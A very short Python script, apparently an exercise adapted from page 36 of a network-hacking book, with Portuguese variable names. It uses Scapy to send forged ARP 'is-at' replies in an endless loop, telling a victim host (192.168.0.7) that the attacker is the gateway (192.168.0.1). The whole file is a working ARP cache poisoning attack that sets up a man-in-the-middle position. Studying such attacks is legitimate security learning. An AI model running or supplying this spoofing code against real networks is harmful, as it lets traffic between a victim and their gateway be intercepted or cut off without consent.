#Adaptacao: Understanding Network Hacks, pag.36
from scapy.all import *

vitima = "192.168.0.7"
gateway = "192.168.0.1"

envenenaVitima = Ether() / ARP(pdst=vitima, psrc=gateway, op="is-at") #1

sendp(envenenaVitima, inter=1, loop=True) #2